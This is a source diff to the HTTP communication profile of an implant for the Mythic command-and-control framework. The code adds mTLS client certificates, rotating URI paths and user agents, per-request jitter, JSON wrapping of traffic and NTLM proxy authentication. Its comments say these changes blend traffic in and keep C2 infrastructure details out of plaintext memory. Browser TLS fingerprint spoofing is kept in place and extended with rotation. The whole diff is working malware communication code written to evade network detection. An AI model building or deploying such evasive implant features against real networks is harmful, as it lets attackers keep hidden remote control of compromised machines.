@@ -9,6 +9,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"net"
 	"net/http"
 	"net/url"
 	"strings"
@@ -32,17 +33,25 @@ type configVault struct {
 // sensitiveConfig holds the C2 configuration fields that should not persist
 // as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
 type sensitiveConfig struct {
-	BaseURL       string            `json:"b"`
-	FallbackURLs  []string          `json:"f,omitempty"`
-	UserAgent     string            `json:"a"`
-	UserAgentPool []string          `json:"ap,omitempty"`
-	EncryptionKey string            `json:"k"`
-	CallbackUUID  string            `json:"c"`
-	HostHeader    string            `json:"h"`
-	GetEndpoint   string            `json:"g"`
-	PostEndpoint  string            `json:"p"`
-	CustomHeaders map[string]string `json:"x,omitempty"`
-	ContentTypes  []string          `json:"ct,omitempty"`
+	BaseURL            string            `json:"b"`
+	FallbackURLs       []string          `json:"f,omitempty"`
+	UserAgent          string            `json:"a"`
+	UserAgentPool      []string          `json:"ap,omitempty"`
+	EncryptionKey      string            `json:"k"`
+	CallbackUUID       string            `json:"c"`
+	HostHeader         string            `json:"h"`
+	GetEndpoint        string            `json:"g"`
+	PostEndpoint       string            `json:"p"`
+	CustomHeaders      map[string]string `json:"x,omitempty"`
+	ContentTypes       []string          `json:"ct,omitempty"`
+	MTLSCertPEM        string            `json:"mc,omitempty"` // PEM client certificate for mTLS
+	MTLSKeyPEM         string            `json:"mk,omitempty"` // PEM client private key for mTLS
+	GetPaths           []string          `json:"gp,omitempty"` // Traffic profile GET path pool
+	PostPaths          []string          `json:"pp,omitempty"` // Traffic profile POST path pool
+	RequestJitterMinMs int               `json:"jn,omitempty"` // Min request jitter (ms)
+	RequestJitterMaxMs int               `json:"jx,omitempty"` // Max request jitter (ms)
+	RequestWrap        string            `json:"rw,omitempty"` // JSON template for wrapping requests
+	ResponseWrap       string            `json:"ru,omitempty"` // JSON template for unwrapping responses
 }
 
 // HTTPProfile handles HTTP communication with Mythic
@@ -60,10 +69,17 @@ type HTTPProfile struct {
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	ContentTypes  []string          // Content-Type rotation pool for request body
 	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
-	client        *http.Client
-	CallbackUUID  string        // Store callback UUID from initial checkin
-	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
-	uaIndex       atomic.Uint32 // Round-robin index for User-Agent rotation
+	GetPaths           []string // Traffic profile GET path rotation pool
+	PostPaths          []string // Traffic profile POST path rotation pool
+	RequestJitterMinMs int      // Minimum per-request jitter (ms) for traffic blending
+	RequestJitterMaxMs int      // Maximum per-request jitter (ms) for traffic blending
+	RequestWrap        string   // JSON template with {DATA} for wrapping outgoing POST bodies
+	ResponseWrap       string   // JSON template with {DATA} for unwrapping server responses
+	client             *http.Client
+	CallbackUUID       string        // Store callback UUID from initial checkin
+	ctIndex            atomic.Uint32 // Round-robin index for Content-Type rotation
+	uaIndex            atomic.Uint32 // Round-robin index for User-Agent rotation
+	pathIndex          atomic.Uint32 // Round-robin index for URI path rotation
 
 	// Fallback C2 URLs for automatic failover when primary is unreachable.
 	FallbackURLs []string
@@ -97,30 +113,71 @@ type HTTPProfile struct {
 	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
 	GetInteractiveOutbound func() []structs.InteractiveMsg
 	HandleInteractive      func(msgs []structs.InteractiveMsg)
+
+	// Key rotation state for forward secrecy (ECDH X25519).
+	keyRotation *keyRotationState
+
+	// Monotonic sequence counter for replay attack protection.
+	// Incremented per outbound message. Server can reject seq ≤ last seen.
+	outSeq atomic.Uint64
 }
 
-// NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
+// ProfileConfig holds the configuration for creating an HTTP C2 profile.
+type ProfileConfig struct {
+	BaseURL        string
+	UserAgent      string
+	EncryptionKey  string
+	MaxRetries     int
+	SleepInterval  int
+	Jitter         int
+	Debug          bool
+	GetEndpoint    string
+	PostEndpoint   string
+	HostHeader     string
+	ProxyURL       string
+	ProxyUser      string
+	ProxyPass      string
+	ProxyDomain    string
+	TLSVerify      string
+	TLSFingerprint string
+	MTLSCertPEM    string
+	MTLSKeyPEM     string
+	FallbackURLs   []string
+	ContentTypes    []string
+	RecoverySeconds int
+	KeyRotationInterval uint64
+}
+
+// NewHTTPProfile creates a new HTTP profile from the given configuration.
+// Proxy behavior: if ProxyDomain is set, NTLM auth is used for the proxy.
+// If ProxyDomain is empty and ProxyUser is set, Basic auth is used.
+// If ProxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY).
+func NewHTTPProfile(cfg ProfileConfig) *HTTPProfile {
 	profile := &HTTPProfile{
-		BaseURL:       baseURL,
-		UserAgent:     userAgent,
-		EncryptionKey: encryptionKey,
-		MaxRetries:    maxRetries,
-		SleepInterval: sleepInterval,
-		Jitter:        jitter,
-		Debug:         debug,
-		GetEndpoint:   getEndpoint,
-		PostEndpoint:  postEndpoint,
-		HostHeader:    hostHeader,
-		FallbackURLs:  fallbackURLs,
-		ContentTypes:  contentTypes,
-		tracker:       resilience.NewTracker(1+len(fallbackURLs), 3, recoverySeconds),
+		BaseURL:       cfg.BaseURL,
+		UserAgent:     cfg.UserAgent,
+		EncryptionKey: cfg.EncryptionKey,
+		MaxRetries:    cfg.MaxRetries,
+		SleepInterval: cfg.SleepInterval,
+		Jitter:        cfg.Jitter,
+		Debug:         cfg.Debug,
+		GetEndpoint:   cfg.GetEndpoint,
+		PostEndpoint:  cfg.PostEndpoint,
+		HostHeader:    cfg.HostHeader,
+		FallbackURLs:  cfg.FallbackURLs,
+		ContentTypes:  cfg.ContentTypes,
+		tracker:       resilience.NewTracker(1+len(cfg.FallbackURLs), 3, cfg.RecoverySeconds),
+		keyRotation:   newKeyRotationState(cfg.KeyRotationInterval),
 	}
 
-	// Configure TLS based on verification mode
-	tlsConfig := buildTLSConfig(tlsVerify)
+	tlsConfig := buildTLSConfig(cfg.TLSVerify)
 
-	// Configure transport with optional proxy
+	if cfg.MTLSCertPEM != "" && cfg.MTLSKeyPEM != "" {
+		if cert, err := tls.X509KeyPair([]byte(cfg.MTLSCertPEM), []byte(cfg.MTLSKeyPEM)); err == nil {
+			tlsConfig.Certificates = []tls.Certificate{cert}
+		}
+	}
+
 	transport := &http.Transport{
 		TLSClientConfig:     tlsConfig,
 		MaxIdleConns:        10,
@@ -128,26 +185,52 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		IdleConnTimeout:     90 * time.Second,
 	}
 
-	// Configure proxy if specified
-	if proxyURL != "" {
-		if proxyU, err := url.Parse(proxyURL); err == nil {
+	useNTLMProxy := cfg.ProxyURL != "" && cfg.ProxyUser != "" && cfg.ProxyDomain != ""
+
+	if useNTLMProxy {
+		proxyU, _ := url.Parse(cfg.ProxyURL)
+		proxyAddr := proxyU.Host
+		if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
+			proxyAddr = net.JoinHostPort(proxyAddr, "8080")
+		}
+		transport.DialTLSContext = ntlmProxyTLSDialer(proxyAddr, cfg.ProxyDomain, cfg.ProxyUser, cfg.ProxyPass, tlsConfig, cfg.TLSFingerprint)
+		transport.TLSClientConfig = nil
+		transport.Proxy = nil
+	} else if cfg.ProxyURL != "" {
+		if proxyU, err := url.Parse(cfg.ProxyURL); err == nil {
+			if cfg.ProxyUser != "" && proxyU.User == nil {
+				if cfg.ProxyPass != "" {
+					proxyU.User = url.UserPassword(cfg.ProxyUser, cfg.ProxyPass)
+				} else {
+					proxyU.User = url.User(cfg.ProxyUser)
+				}
+			}
 			transport.Proxy = http.ProxyURL(proxyU)
+		}
+	} else {
+		transport.Proxy = systemProxyFunc()
+	}
+
+	if !useNTLMProxy {
+		if isRotateFingerprint(cfg.TLSFingerprint) {
+			transport.DialTLSContext = buildRotatingDialer(tlsConfig)
+			transport.TLSClientConfig = nil
+		} else if helloID, ok := tlsFingerprintID(cfg.TLSFingerprint); ok {
+			transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
+			transport.TLSClientConfig = nil
 		}
 	}
 
-	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
-	// the TLS ClientHello. This replaces Go's default TLS stack with uTLS for
-	// HTTPS connections, producing a browser-matching JA3 fingerprint.
-	if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
-		transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
-		// Clear TLSClientConfig — uTLS handles TLS now, and having both
-		// causes http.Transport to skip DialTLSContext for HTTPS.
-		transport.TLSClientConfig = nil
+	var rt http.RoundTripper = transport
+	if transport.DialTLSContext != nil {
+		rt = newH2AwareTransport(transport, transport.DialTLSContext)
+	} else if strings.HasPrefix(cfg.BaseURL, "https://") {
+		transport.ForceAttemptHTTP2 = true
 	}
 
 	profile.client = &http.Client{
 		Timeout:   30 * time.Second,
-		Transport: transport,
+		Transport: rt,
 	}
 
 	return profile
@@ -170,17 +253,23 @@ func (h *HTTPProfile) SealConfig() error {
 	}
 
 	cfg := &sensitiveConfig{
-		BaseURL:       h.BaseURL,
-		FallbackURLs:  h.FallbackURLs,
-		UserAgent:     h.UserAgent,
-		UserAgentPool: h.UserAgentPool,
-		EncryptionKey: h.EncryptionKey,
-		CallbackUUID:  h.CallbackUUID,
-		HostHeader:    h.HostHeader,
-		GetEndpoint:   h.GetEndpoint,
-		PostEndpoint:  h.PostEndpoint,
-		CustomHeaders: h.CustomHeaders,
-		ContentTypes:  h.ContentTypes,
+		BaseURL:            h.BaseURL,
+		FallbackURLs:       h.FallbackURLs,
+		UserAgent:          h.UserAgent,
+		UserAgentPool:      h.UserAgentPool,
+		EncryptionKey:      h.EncryptionKey,
+		CallbackUUID:       h.CallbackUUID,
+		HostHeader:         h.HostHeader,
+		GetEndpoint:        h.GetEndpoint,
+		PostEndpoint:       h.PostEndpoint,
+		CustomHeaders:      h.CustomHeaders,
+		ContentTypes:       h.ContentTypes,
+		GetPaths:           h.GetPaths,
+		PostPaths:          h.PostPaths,
+		RequestJitterMinMs: h.RequestJitterMinMs,
+		RequestJitterMaxMs: h.RequestJitterMaxMs,
+		RequestWrap:        h.RequestWrap,
+		ResponseWrap:       h.ResponseWrap,
 	}
 
 	plaintext, err := json.Marshal(cfg)
@@ -210,6 +299,12 @@ func (h *HTTPProfile) SealConfig() error {
 	h.CustomHeaders = nil
 	h.ContentTypes = nil
 	h.UserAgentPool = nil
+	h.GetPaths = nil
+	h.PostPaths = nil
+	h.RequestJitterMinMs = 0
+	h.RequestJitterMaxMs = 0
+	h.RequestWrap = ""
+	h.ResponseWrap = ""
 
 	return nil
 }
@@ -221,17 +316,23 @@ func (h *HTTPProfile) SealConfig() error {
 func (h *HTTPProfile) getConfig() *sensitiveConfig {
 	if h.vault == nil {
 		return &sensitiveConfig{
-			BaseURL:       h.BaseURL,
-			FallbackURLs:  h.FallbackURLs,
-			UserAgent:     h.UserAgent,
-			UserAgentPool: h.UserAgentPool,
-			EncryptionKey: h.EncryptionKey,
-			CallbackUUID:  h.CallbackUUID,
-			HostHeader:    h.HostHeader,
-			GetEndpoint:   h.GetEndpoint,
-			PostEndpoint:  h.PostEndpoint,
-			CustomHeaders: h.CustomHeaders,
-			ContentTypes:  h.ContentTypes,
+			BaseURL:            h.BaseURL,
+			FallbackURLs:       h.FallbackURLs,
+			UserAgent:          h.UserAgent,
+			UserAgentPool:      h.UserAgentPool,
+			EncryptionKey:      h.EncryptionKey,
+			CallbackUUID:       h.CallbackUUID,
+			HostHeader:         h.HostHeader,
+			GetEndpoint:        h.GetEndpoint,
+			PostEndpoint:       h.PostEndpoint,
+			CustomHeaders:      h.CustomHeaders,
+			ContentTypes:       h.ContentTypes,
+			GetPaths:           h.GetPaths,
+			PostPaths:          h.PostPaths,
+			RequestJitterMinMs: h.RequestJitterMinMs,
+			RequestJitterMaxMs: h.RequestJitterMaxMs,
+			RequestWrap:        h.RequestWrap,
+			ResponseWrap:       h.ResponseWrap,
 		}
 	}
 
